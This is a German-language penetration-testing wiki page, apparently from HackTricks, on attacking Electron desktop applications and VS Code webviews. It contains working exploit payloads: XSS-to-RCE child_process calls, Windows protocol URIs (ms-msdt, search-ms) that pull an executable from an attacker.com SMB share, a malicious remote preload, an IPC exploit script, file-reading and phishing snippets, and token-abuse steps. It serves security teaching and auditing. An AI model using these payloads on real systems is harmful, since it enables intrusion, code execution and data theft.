# Electron-Desktop-Apps

{{#include ../../banners/hacktricks-training.md}}

## Einführung

Electron kombiniert einen privilegierten **Node.js**-Hauptprozess mit **Chromium**-Renderer-Prozessen. Electron ist kein Webbrowser: Anwendungscode kann bewusst Funktionen wie Dateisystem- und Shell-Zugriff bereitstellen. Daher erfordert das Laden nicht vertrauenswürdiger Inhalte eine strengere Gestaltung der Sicherheitsgrenzen als bei einer gewöhnlichen Website.<sup>[[21]](#references)</sup>

Electron-Anwendungscode wird häufig in einem `.asar`-Archiv verpackt. Extrahiere es, bevor du den Quellcode überprüfst:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Die `package.json` der Anwendung gibt ihren Haupteinstiegspunkt an. Diese Datei erstellt häufig Renderer-Fenster und legt deren sicherheitsrelevante `webPreferences` fest.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron hat zwei grundlegende Prozesstypen:

- Main Process (hat vollständigen Zugriff auf NodeJS)
- Renderer Process (sollte aus Sicherheitsgründen nur eingeschränkten Zugriff auf NodeJS haben)

![Electron Desktop Apps – Einführung: Renderer Process (sollte aus Sicherheitsgründen nur eingeschränkten Zugriff auf NodeJS haben)](<../../images/image (182).png>)

Ein **Renderer Process** ist ein Browserfenster, das eine Datei lädt:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Der **main process** konfiguriert jeden renderer process, häufig beim Erstellen eines `BrowserWindow`. Sichere Einstellungen verringern die Wahrscheinlichkeit, dass aus einer Kompromittierung des Renderers die Ausführung nativen Codes wird, machen nicht vertrauenswürdige Inhalte aber nicht von sich aus sicher.<sup>[[21]](#references)[[22]](#references)</sup>

Überprüfen Sie mindestens diese Renderer-Einstellungen:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** ist standardmäßig `false`. Wenn diese Option aktiviert wird, erhält JavaScript im Renderer Zugriff auf Node.js-APIs und die Sandbox dieses Renderers wird ebenfalls deaktiviert.
- **`contextIsolation`** ist standardmäßig `true`. Dadurch wird der JavaScript-Kontext der Seite vom Kontext der Preload-Skripte und der Electron-Interna getrennt.
- **`preload`** hat standardmäßig keinen Pfad. Ein konfiguriertes Preload-Skript wird vor den Skripten der Seite ausgeführt und kann über `contextBridge` eng begrenzte APIs bereitstellen.
- **`sandbox`** ist seit Electron 20 standardmäßig `true`. Dadurch wird der Zugriff des Renderers auf Betriebssystemressourcen eingeschränkt; mit `nodeIntegration: true` wird die Sandbox deaktiviert.
- **`nodeIntegrationInWorker`** ist standardmäßig `false` und steuert die Node.js-Integration in Web Workers.
- **`nodeIntegrationInSubFrames`** ist standardmäßig `false`.
  - Wenn **`nodeIntegration`** **aktiviert** ist, können **Node.js-APIs** in Webseiten verwendet werden, die innerhalb einer Electron-Anwendung in **iframes geladen** werden.
  - Wenn **`nodeIntegration`** **deaktiviert** ist, werden Preloads im iframe geladen

Beispielkonfiguration:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Einige **RCE payloads** von [here](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Datenverkehr erfassen

Ändere die start-main-Konfiguration und füge die Verwendung eines Proxys hinzu, zum Beispiel:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statische ASAR-zu-Nativ-Grenzverfolgung mit REA

**REA** kann ein ASAR-Archiv oder ein extrahiertes Anwendungsverzeichnis lesen, ohne den JavaScript-Bootstrap auszuführen. Der Anwendungsgraph erfasst Paket-Einstiegspunkte, gebündelte Module, `BrowserWindow`- und Preload-Einstellungen, `contextBridge`-Elemente, IPC-Registrierungen, Anfragen für native Add-ons und Source-Map-Identitäten. Damit lässt sich eine rendererseitig zugängliche Funktion bis zu einem privilegierten Handler im Hauptprozess zurückverfolgen.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Für einen wörtlichen Feature-String übergib den vollständigen Evidence-Datensatz als `application` und ersetze den Seed durch einen, der im Ziel beobachtet wurde:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Derselbe `trace_application_feature` workflow akzeptiert auch ein beobachtetes literales API-Member, einen IPC-Kanal oder ein Modul als Seed. Prüfe den resultierenden Handler-Pfad, die Validierungskandidaten und die native Übergabe anhand der zurückgegebenen Quellcodepositionen. Ein Renderer-`invoke` passt nur zu einem eindeutigen `ipcMain.handle`-/`handleOnce`-Kandidaten auf demselben exakten literalen Kanal; `send` erfordert entsprechend einen eindeutigen `ipcMain.on`-/`once`-/`addListener`-Kandidaten. Dynamische oder doppelte Handler bleiben ungeklärt. Ein angefordertes `.node`-Member ist kein verifizierter nativer Export; die passende Hopper-/Ghidra-Evidence muss denselben Artefakt-Digest haben, bevor diese Schlussfolgerung gezogen wird. Statische Erreichbarkeit beweist außerdem nicht, dass der Pfad ausgeführt wurde.<sup>[[24]](#references)[[25]](#references)</sup>

Zur Vertrauensgrenze zwischen Renderer und Main-Prozess sowie zur Handler-Validierung siehe [RCE in Electron über contextIsolation und IPC](electron-contextisolation-rce-via-ipc.md).

Für native Folgeuntersuchungen mit Provider siehe [Reversing-Tools und grundlegende Methoden](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Angriffsfläche von Electron-Auto-Updates

Zur Integrität von Release-Feeds, Rollback, Verwechslung signierter Channels und TOCTOU bei Staging-Dateien siehe [Vertrauensgrenzen bei Electron-Auto-Updates](electron-auto-update-trust-boundaries.md).

## Lokale Code-Injection in Electron

Bei lokalem Schreib- oder Instrumentierungszugriff auf eine installierte App siehe [Lokale Code-Injection und Snapshot-Manipulation in Electron](electron-local-code-injection-and-snapshot-tampering.md) zu ASAR-/Main-Prozess- und V8-Snapshot-Pfaden sowie den betriebssystemspezifischen Links.

## RCE: XSS + nodeIntegration

Wenn **nodeIntegration** auf **on** gesetzt ist, kann das JavaScript einer Webseite Node.js-Funktionen einfach durch Aufruf von `require()` verwenden. So lässt sich beispielsweise die calc-Anwendung unter Windows ausführen:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Das in dieser Einstellung angegebene Skript wird **vor anderen Skripten im Renderer geladen**, sodass es **uneingeschränkten Zugriff auf Node-APIs** hat:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Daher kann das Skript node-features in Seiten exportieren:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Wenn `contextIsolation` aktiviert ist, funktioniert das nicht**

## RCE: XSS + contextIsolation

_**contextIsolation**_ sorgt für **getrennte Kontexte zwischen den Skripten der Webseite und dem internen JavaScript-Code von Electron**, sodass sich die JavaScript-Ausführung des jeweiligen Codes nicht gegenseitig beeinflusst. Diese Funktion ist erforderlich, um die Möglichkeit von RCE auszuschließen.

Wenn die Kontexte nicht isoliert sind, kann ein Angreifer:

1. **Beliebiges JavaScript im renderer ausführen** (XSS oder Navigation zu externen Websites)
2. **Die integrierte Methode überschreiben**, die im Preload- oder internen Electron-Code verwendet wird, um eine eigene Funktion einzusetzen
3. Die Verwendung der **überschriebenen Funktion auslösen**
4. RCE?

Es gibt zwei Stellen, an denen integrierte Methoden überschrieben werden können: im Preload-Code oder im internen Electron-Code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Click-Event umgehen

Wenn beim Klicken auf einen Link Einschränkungen greifen, kannst du sie möglicherweise umgehen, indem du **mit der mittleren Maustaste klickst** statt mit der linken.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Weitere Informationen zu diesen Beispielen findest du unter [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) und [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Beim Bereitstellen einer Electron-Desktopanwendung ist es entscheidend, die richtigen Einstellungen für `nodeIntegration` und `contextIsolation` sicherzustellen. Es steht fest, dass **clientseitige Remote Code Execution (RCE)**, die auf Preload-Skripte oder den nativen Electron-Code aus dem Hauptprozess abzielt, mit diesen Einstellungen effektiv verhindert wird.

Wenn ein Benutzer mit Links interagiert oder neue Fenster öffnet, werden bestimmte Ereignis-Listener ausgelöst, die für die Sicherheit und Funktionalität der Anwendung entscheidend sind:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Diese Listener werden **von der Desktop-Anwendung überschrieben**, um ihre eigene **Geschäftslogik** zu implementieren. Die Anwendung prüft, ob ein aufgerufener Link intern oder in einem externen Webbrowser geöffnet werden soll. Diese Entscheidung wird in der Regel über eine Funktion namens `openInternally` getroffen. Gibt diese Funktion `false` zurück, bedeutet das, dass der Link extern über die Funktion `shell.openExternal` geöffnet werden soll.

**Vereinfachter Pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Die Best Practices zur Sicherheit von Electron JS raten davon ab, nicht vertrauenswürdige Inhalte mit der Funktion `openExternal` zu öffnen, da dies über verschiedene Protokolle zu RCE führen könnte. Betriebssysteme unterstützen unterschiedliche Protokolle, die RCE auslösen können. Ausführliche Beispiele und weitere Erläuterungen zu diesem Thema finden Sie in [dieser Quelle](https://positive.security/blog/url-open-rce#windows-10-19042), die Beispiele für Windows-Protokolle enthält, mit denen sich diese Schwachstelle ausnutzen lässt.<sup>[[10]](#references)</sup>

In macOS kann die Funktion `openExternal` ausgenutzt werden, um beliebige Befehle auszuführen, zum Beispiel mit `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Beispiele für Windows-Protokoll-Exploits sind:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Diese Schwachstelle ist in **[diesem Bericht](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)** beschrieben.<sup>[[11]](#references)</sup>

Das **webviewTag** ist ein **veraltetes Feature**, das die Verwendung von **NodeJS** im **renderer process** ermöglicht. Es sollte deaktiviert werden, da es das Laden eines Skripts im preload-Kontext ermöglicht, etwa so:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Daher könnte ein Angreifer, dem es gelingt, eine beliebige Seite zu laden, dieses Tag verwenden, um **ein beliebiges Preload-Skript zu laden**.

Dieses Preload-Skript wurde anschließend missbraucht, um einen **verwundbaren IPC-Dienst (`skype-new-window`)** aufzurufen, der **`shell.openExternal`** aufrief, um RCE zu erzielen:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Interne Dateien lesen: XSS + contextIsolation

**Das Deaktivieren von `contextIsolation` ermöglicht die Verwendung von `<webview>`-Tags**, ähnlich wie `<iframe>`, um lokale Dateien zu lesen und zu exfiltrieren. Ein bereitgestelltes Beispiel zeigt, wie diese Schwachstelle ausgenutzt werden kann, um den Inhalt interner Dateien zu lesen:<sup>[[2]](#references)</sup>

![RCE: webviewTag + verwundbares preload IPC + shell.openExternal - Interne Dateien lesen: XSS + contextIsolation: Das Deaktivieren von contextIsolation ermöglicht die Verwendung von Tags , ähnlich wie , um...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Außerdem wird eine weitere Methode zum **Lesen einer internen Datei** vorgestellt, die eine kritische Schwachstelle zum Lesen lokaler Dateien in einer Electron-Desktop-App aufzeigt. Dabei wird ein Skript eingeschleust, um die Anwendung auszunutzen und Daten zu exfiltrieren:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Altes Chromium**

Wenn die in der Anwendung gebündelte **Chromium**-Version alt ist und bekannte Schwachstellen aufweist, kann es möglich sein, diese auszunutzen und XSS in RCE umzuwandeln.<sup>[[20]](#references)</sup>\
Ein Beispiel findest du in diesem **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS-Phishing durch Umgehung der internen URL-RegEx**

Wenn du XSS findest, aber **kein RCE auslösen oder interne Dateien stehlen kannst**, könntest du trotzdem versuchen, **Anmeldedaten per Phishing zu stehlen**.<sup>[[1]](#references)</sup>

Untersuche zuerst den Frontend-Code, um herauszufinden, was passiert, wenn eine neue URL geöffnet wird:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Der Aufruf von **`openInternally`** entscheidet, ob ein Plattform-Link im **Desktop-Fenster** oder eine Drittanbieter-Ressource im Systembrowser geöffnet wird.

Lässt sich die URL-Allowlist-RegEx der Funktion umgehen – zum Beispiel, weil Punkte in einem Hostnamen nicht escaped wurden –, könnte ein Angreifer XSS missbrauchen, um auf einer von ihm kontrollierten Infrastruktur eine überzeugende Anmeldeaufforderung zu öffnen:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://`-Protokoll

Wie im [Electron-Sicherheitsleitfaden](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) erwähnt, erhalten Seiten, die unter **`file://`** laufen, weitreichenden Dateizugriff. Daher kann **XSS dazu genutzt werden, beliebige Dateien** vom Rechner des Benutzers zu laden. Ein korrekt entworfenes **custom protocol** kann den Zugriff auf eine bestimmte Dateiauswahl beschränken.<sup>[[21]](#references)</sup>

Einen separaten Bypass des Dateibereichs im Worker-Kontext bei Vorschauen von Desktop-Assistenten findest du unter [Vertrauensgrenzen eingebetteter Browser in AI-Assistenten](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote-Modul

Das Electron-Remote-Modul ermöglicht **Renderer-Prozessen den Zugriff auf APIs des Main-Prozesses** und erleichtert so die Kommunikation innerhalb einer Electron-Anwendung. Das Aktivieren dieses Moduls birgt jedoch erhebliche Sicherheitsrisiken. Es vergrößert die Angriffsfläche der Anwendung und macht sie anfälliger für Schwachstellen wie Cross-Site-Scripting-Angriffe (XSS).

> [!TIP]
> Obwohl das **remote**-Modul einige APIs vom Main-Prozess für Renderer-Prozesse bereitstellt, ist es nicht ganz einfach, allein durch den Missbrauch der Komponenten RCE zu erreichen. Die Komponenten können jedoch vertrauliche Informationen offenlegen.

> [!WARNING]
> Viele Apps, die noch das Remote-Modul verwenden, tun dies auf eine Weise, die **NodeIntegration im Renderer-Prozess erfordert**. Das ist ein **erhebliches Sicherheitsrisiko**.

Ectron hat das integrierte `remote`-Modul zunächst als veraltet markiert und anschließend entfernt. Anwendungen, die dieses Modell weiterhin benötigen, können das separate Paket `@electron/remote` verwenden. Aufgrund der Sicherheits- und Leistungsauswirkungen solltest du vermeiden, nicht vertrauenswürdigen Renderern Remote-ähnliche Funktionen bereitzustellen.

Bei `@electron/remote` muss das Modul zunächst **im Main-Prozess initialisiert werden**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Der Renderer-Prozess kann dann Objekte aus dem Modul importieren:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Der **[Blogbeitrag](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** weist auf einige interessante **Funktionen** hin, die das Objekt **`app`** aus dem Remote-Modul bereitstellt:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Startet** die Anwendung neu, indem die aktuelle Instanz **beendet** und eine neue **gestartet** wird. Nützlich für **App-Updates** oder wesentliche **Zustandsänderungen**.
- **`app.setAppLogsPath([path])`**  
   - **Legt** ein Verzeichnis zum Speichern von **App-Logs** fest oder **erstellt** es. Die Logs können mit **`app.getPath()`** oder **`app.setPath(pathName, newPath)`** **abgerufen** oder **geändert** werden.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registriert** die aktuelle ausführbare Datei als **Standardhandler** für ein angegebenes **Protokoll**. Bei Bedarf können ein **benutzerdefinierter Pfad** und **Argumente** angegeben werden.
- **`app.setUserTasks(tasks)`**  
   - **Fügt** der Kategorie **Tasks** in der **Jump List** (unter Windows) Tasks hinzu. Jeder Task kann steuern, wie die App **gestartet** wird oder welche **Argumente** übergeben werden.
- **`app.importCertificate(options, callback)`**  
   - **Importiert** ein **PKCS#12-Zertifikat** in den **Zertifikatsspeicher** des Systems (nur unter Linux). Ein **Callback** kann verwendet werden, um das Ergebnis zu verarbeiten.
- **`app.moveToApplicationsFolder([options])`**  
   - **Verschiebt** die Anwendung in den **Applications-Ordner** (unter macOS). Dies sorgt für eine **standardmäßige Installation** für Mac-Benutzer.
- **`app.setJumpList(categories)`**  
   - **Legt** eine **benutzerdefinierte Jump List** unter **Windows** fest oder **entfernt** sie. Sie können **Kategorien** angeben, um zu organisieren, wie dem Benutzer Tasks angezeigt werden.
- **`app.setLoginItemSettings(settings)`**  
   - **Konfiguriert**, welche **ausführbaren Dateien** zusammen mit ihren **Optionen** bei der **Anmeldung** gestartet werden (nur unter macOS und Windows).
  
Beispiel:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences module

Die **primäre API** für den Zugriff auf Systemeinstellungen und das **Auslösen von Systemereignissen** in Electron. Methoden wie **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** und **setUserDefault** sind alle **Teil** dieses Moduls.

**Beispielverwendung:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Lauscht** mithilfe von NSDistributedNotificationCenter auf **native macOS-Benachrichtigungen**.  
* Vor **macOS Catalina** konnte man **alle** verteilten Benachrichtigungen abfangen, indem man **nil** an CFNotificationCenterAddObserver übergab.  
* Seit **Catalina / Big Sur** können sandboxed Apps weiterhin **viele Ereignisse** (zum Beispiel **Bildschirmsperren/-entsperrungen**, **Volume-Mounts**, **Netzwerkaktivität** usw.) **abonnieren**, indem sie Benachrichtigungen **nach Namen** registrieren.

### **getUserDefault / setUserDefault**

* **Schnittstelle** zu NSUserDefaults, wo macOS **Anwendungs-** oder **globale** Einstellungen speichert.
    
* **getUserDefault** kann sensible Informationen abrufen, zum Beispiel **zuletzt verwendete Dateipfade** oder den **geografischen Standort des Benutzers**.
    
* **setUserDefault** kann diese Einstellungen **ändern** und dadurch möglicherweise die **Konfiguration** einer App beeinflussen.
    
* In **älteren Electron-Versionen** (vor v8.3.0) war nur die **standard suite** von NSUserDefaults **zugänglich**.

## Shell.showItemInFolder

Diese Funktion zeigt die angegebene Datei in einem Dateimanager an. Auf betroffenen Plattformen und Versionen konnte diese Interaktion **die Datei automatisch ausführen**.

Weitere Informationen finden Sie unter [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Content Security Policy

Electron-Apps sollten über eine **Content Security Policy (CSP)** verfügen, um **XSS-Angriffe zu verhindern**. Die **CSP** ist ein **Sicherheitsstandard**, der dabei hilft, die **Ausführung** von **nicht vertrauenswürdigem Code** im Browser zu **verhindern**.

Sie wird üblicherweise in der Datei **`main.js`** oder in der Vorlage **`index.html`** konfiguriert, wobei sich die CSP in einem **meta-Tag** befindet.

Weitere Informationen finden Sie unter:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview-CSP + postMessage-Vertrauen + Laden lokaler Dateien (VS Code 1.63)

Diese reale Angriffskette betraf Visual Studio Code 1.63 (CVE-2021-43908) und zeigt, wie sich eine einzelne durch Markdown ausgelöste XSS in einer Webview zu vollständiger RCE eskalieren lässt, wenn CSP, postMessage und Scheme-Handler falsch konfiguriert sind. Öffentlicher PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Überblick über die Angriffskette
- Erste XSS über die Webview-CSP: Die generierte CSP enthielt `style-src 'self' 'unsafe-inline'`, wodurch Inline-Injection und Injection über Styles in einem `vscode-webview://`-Kontext möglich waren. Die Payload sendete einen Beacon an `/stealID`, um die extensionId der Ziel-Webview zu exfiltrieren.
- Erstellen der Ziel-Webview-URL: Die geleakte ID wurde verwendet, um `vscode-webview://<extensionId>/.../<publicUrl>` zu erstellen.
- Zweite XSS durch Vertrauen in postMessage: Die äußere Webview vertraute `window.postMessage` ohne strenge Prüfung von Origin und Typ und lud vom Angreifer bereitgestelltes HTML mit `allowScripts: true`.
- Laden lokaler Dateien durch Umschreiben von Scheme/Pfad: Die Payload schrieb `file:///...` in `vscode-file://vscode-app/...` um und ersetzte `exploit.md` durch `RCE.html`. Dabei nutzte sie eine schwache Pfadvalidierung aus, um eine privilegierte lokale Ressource zu laden.
- RCE in einem Node-fähigen Kontext: Das geladene HTML wurde mit verfügbaren Node-APIs ausgeführt und ermöglichte so die Ausführung von Betriebssystembefehlen.

Beispiel für ein RCE-Primitiv im finalen Kontext
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Weiterführende Lektüre zu Vertrauensproblemen bei postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: synthetische Webview-Shortcuts + deklarative Extension-Command-Bridges

Im Juni 2026 tauchte eine andere Klasse von Webview-Escapes in VS Code auf: **Nicht vertrauenswürdiges JavaScript innerhalb einer Notebook-/Preview-Webview konnte privilegierte globale Shortcuts synthetisieren**, weil der Webview-Preload `keydown`-Daten an die Host-Workbench weiterleitete und der Host sie wie echte Benutzereingaben behandelte.<sup>[[14]](#references)</sup>

Dies ist Teil einer längeren Geschichte von Angriffen auf IDE-Vertrauensgrenzen, bei denen projektgesteuerte Inhalte privilegierte Editorfunktionen erreichen.<sup>[[19]](#references)</sup>

### Versagen der Vertrauensgrenze

Wenn eine Cross-Origin-/Sandboxed-Webview vom Angreifer kontrollierte Tastaturfelder (`key`, `code`, `keyCode`, Modifier, `repeat`) in eine privilegierte `postMessage`-/Message-Port-Bridge kopiert, **ohne `event.isTrusted` zu prüfen**, kann JavaScript innerhalb der Webview Workbench-Shortcuts ausführen mit:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Dies ist besonders nützlich, wenn **synthetische Eingaben vom Browser blockiert werden**. Skriptgesteuerte Tastenereignisse können normalerweise **keinen beliebigen Text in HTML-`<input>`-Elemente eingeben**, lösen aber weiterhin Tastenkombinationen aus, die `keydown` direkt verarbeiten.

### Praktische Missbrauchsmuster

- **Missbrauch shortcut-orientierter Benutzeroberflächen:** Ziele auf globale Tastenkombinationen wie das Bestätigen von Benachrichtigungen, die Navigation in Paletten, das Aktivieren fokussierter Schaltflächen oder die Menünavigation, statt zu versuchen, Befehle einzugeben.
- **Vorhersehbare privilegierte Eingabeaufforderungen durch Workspace-Metadaten:** Eine vom Repository kontrollierte `.vscode/extensions.json` kann eine Angreifer-Extension empfehlen und eine vorhersehbare Installationsbenachrichtigung erzeugen, die mit einer Tastenkombination wie `Ctrl+Shift+A` bestätigt werden kann.
- **Deklaratives Extension-Manifest als Befehlsbrücke:** Selbst wenn lokaler Workspace-Extension-Code in web VS Code durch CSP blockiert wird, können deklarative `package.json`-Beiträge weiterhin geladen werden. Eine lokale Extension unter `.vscode/extensions` kann eine Tastenbelegung registrieren, die `runCommands` und anschließend einen privilegierten internen Befehl wie `workbench.extensions.installExtension` aufruft.<sup>[[14]](#references)[[18]](#references)</sup>

Beispiel für ein Manifestmuster:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Versteckte Sicherheits-Flags, die über nicht vertrauenswürdige Metadaten erreichbar sind:** Wenn der interne Befehl vom Angreifer kontrollierte Argumente wie `{"context":{"skipPublisherTrust":true}}` akzeptiert, können deklarative Metadaten einen Vertrauensdialog unterdrücken und eine Marketplace-/CDN-gehostete Extension installieren, die schließlich Angreifer-Code ausführt.
- **Missbrauch vertrauenswürdiger Workspaces:** Wenn Remote-/Web-Workspaces automatisch als vertrauenswürdig eingestuft werden, werden lokale Workspace-Extensions zu einer wertvollen Brücke zwischen Repository-Inhalten und privilegierten Editor-Aktionen.
- **Ausweitung des Umfangs nach einer Kompromittierung:** Prüfe nach der Ausführung der Extension, auf welche Tokens der Editor Extensions Zugriff gewährt. In `github.dev` war das gestohlene GitHub-Token nicht auf das geöffnete Repository beschränkt, sodass die Abfrage von `https://api.github.com/user/repos` weitere zugängliche private Repositories auflistete.

### Audit-Hinweise

- Behandle die **Weiterleitung von Eingaben aus Webviews an den Host** als Privileggrenze; leite niemals synthetische Tastatur-/Klickereignisse aus nicht vertrauenswürdigen Frames an den Host weiter.
- Erzwinge die Autorisierung **innerhalb** sensibler Befehle. Akzeptiere keinen vom Aufrufer bereitgestellten Befehlskontext, der interne Flags wie `skipPublisherTrust` setzen kann.
- Gehe nicht davon aus, dass das Blockieren ausführbaren lokalen Extension-Codes ausreicht; prüfe auch **deklarative Beiträge** (`keybindings`, `menus`, `commands`, tasks) aus manifests, die vom Workspace kontrolliert werden.
